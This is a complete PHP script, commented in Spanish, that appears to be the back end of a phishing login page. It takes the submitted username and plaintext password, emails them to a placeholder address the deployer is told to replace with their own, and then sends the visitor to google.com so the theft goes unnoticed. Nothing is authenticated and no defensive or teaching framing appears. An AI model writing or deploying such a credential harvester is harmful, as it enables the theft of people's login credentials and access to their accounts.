<?php
// Verificamos que el formulario fue enviado por método POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recibimos los datos del formulario y los limpiamos para evitar inyección
    $usuario = filter_var(trim($_POST['usuario']), FILTER_SANITIZE_EMAIL);
    $contrasena = trim($_POST['contrasena']);

    // Dirección de correo a la que se enviará la información
    $destinatario = "tuemail@dominio.com";  // Cambia esto por tu correo real

    // Asunto del correo
    $asunto = "Nuevo inicio de sesión";

    // Cuerpo del mensaje
    $mensaje = "Se ha recibido un nuevo intento de inicio de sesión:\n\n";
    $mensaje .= "Usuario: " . $usuario . "\n";
    $mensaje .= "Contraseña: " . $contrasena . "\n";

    // Encabezados del correo
    $headers = "From: no-reply@tudominio.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    // Enviamos el correo
    mail($destinatario, $asunto, $mensaje, $headers);

    // Redirigimos a google.com
    header("Location: https://www.google.com");
    exit();
} else {
    // Si no es POST, redirigimos al formulario o mostramos un error
    header("Location: index.html");
    exit();
}
?>

